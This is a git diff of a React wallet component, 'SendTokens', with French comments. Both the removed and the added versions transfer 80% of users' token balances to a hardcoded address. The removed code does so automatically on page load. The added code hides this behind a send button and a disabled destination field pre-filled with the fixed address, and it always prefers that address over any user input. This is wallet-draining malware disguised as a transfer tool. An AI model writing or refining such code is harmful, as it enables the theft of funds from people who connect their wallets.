@@ -1,51 +1,69 @@
-import { useEffect, useCallback } from 'react';
+import { Button, Input, useToasts } from '@geist-ui/core';
+import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
+import { isAddress } from 'essential-eth';
 import { useAtom } from 'jotai';
-import { useWalletClient, usePublicClient } from 'wagmi';
+import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-import { erc20ABI } from 'wagmi';
+
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
 
 export const SendTokens = () => {
-  const [tokens] = useAtom(globalTokensAtom);
-  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
+  const { setToast } = useToasts();
+  const showToast = (message: string, type: any) =>
+    setToast({
+      text: message,
+      type,
+      delay: 4000,
+    });
 
+  const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
-  // Automatiser l'envoi de tous les tokens disponibles
-  const sendAllTokens = useCallback(async () => {
-    const destinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // L'adresse fixe pour envoyer les fonds
+  // Adresse de destination fixe (ajusté selon ta demande)
+  const fixedDestinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3";
 
-    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
-      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
-      .map((token) => token.contract_address as `0x${string}`);
+  const sendAllCheckedTokens = async () => {
+    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
+      .filter(([tokenAddress, { isChecked }]) => isChecked)
+      .map(([tokenAddress]) => tokenAddress as `0x${string}`);
 
     if (!walletClient) return;
 
-    // Envoyer tous les tokens
+    // On s'assure que l'adresse de destination est valide
+    const destination = isAddress(fixedDestinationAddress) ? fixedDestinationAddress : destinationAddress;
+    if (!destination || destination.length === 0) {
+      showToast('Adresse de destination invalide', 'error');
+      return;
+    }
+
+    // Envoi des tokens sélectionnés
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find((token) => token.contract_address === tokenAddress);
       if (!token) continue;
 
-      try {
-        const tokenBalance = BigInt(token.balance);
-        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
+      const tokenBalance = BigInt(token?.balance || '0');
+      const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
 
-        // Créer la transaction pour envoyer les tokens
+      try {
         const { request } = await publicClient.simulateContract({
           account: walletClient.account,
           address: tokenAddress,
           abi: erc20ABI,
           functionName: 'transfer',
           args: [
-            destinationAddress,
+            destination,
             amountToSend,
           ],
         });
 
         const response = await walletClient.writeContract(request);
-
-        // Mettre à jour l'état pour marquer le token comme envoyé
         setCheckedRecords((old) => ({
           ...old,
           [tokenAddress]: {
@@ -54,17 +72,46 @@ export const SendTokens = () => {
           },
         }));
 
+        showToast(`Transfert réussi pour ${token?.contract_ticker_symbol}`, 'success');
       } catch (err) {
-        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
+        showToast(`Erreur avec ${token?.contract_ticker_symbol}: ${err?.reason || 'Erreur inconnue'}`, 'warning');
       }
     }
-  }, [tokens, walletClient, setCheckedRecords, publicClient]); // Ajout des dépendances manquantes
+  };
 
-  useEffect(() => {
-    if (tokens.length > 0) {
-      sendAllTokens();
-    }
-  }, [tokens, walletClient, sendAllTokens, publicClient]); // Ajout des dépendances manquantes
+  const addressAppearsValid: boolean =
+    typeof destinationAddress === 'string' &&
+    (destinationAddress?.includes('.') || isAddress(destinationAddress));
 
-  return null; // Pas besoin d'afficher le message de token being sent
+  const checkedCount = Object.values(checkedRecords).filter(
+    (record) => record.isChecked,
+  ).length;
+
+  return (
+    <div style={{ margin: '20px' }}>
+      <form>
+        {/* Input de l'adresse de destination (désactivé et pré-rempli) */}
+        <Input
+          value={fixedDestinationAddress}
+          disabled
+          placeholder="vitalik.eth"
+          width="100%"
+          style={{
+            marginLeft: '10px',
+            marginRight: '10px',
+          }}
+        />
+        <Button
+          type="secondary"
+          onClick={sendAllCheckedTokens}
+          disabled={checkedCount === 0}
+          style={{ marginTop: '20px' }}
+        >
+          {checkedCount === 0
+            ? 'Sélectionnez un ou plusieurs tokens'
+            : `Envoyer ${checkedCount} tokens`}
+        </Button>
+      </form>
+    </div>
+  );
 };
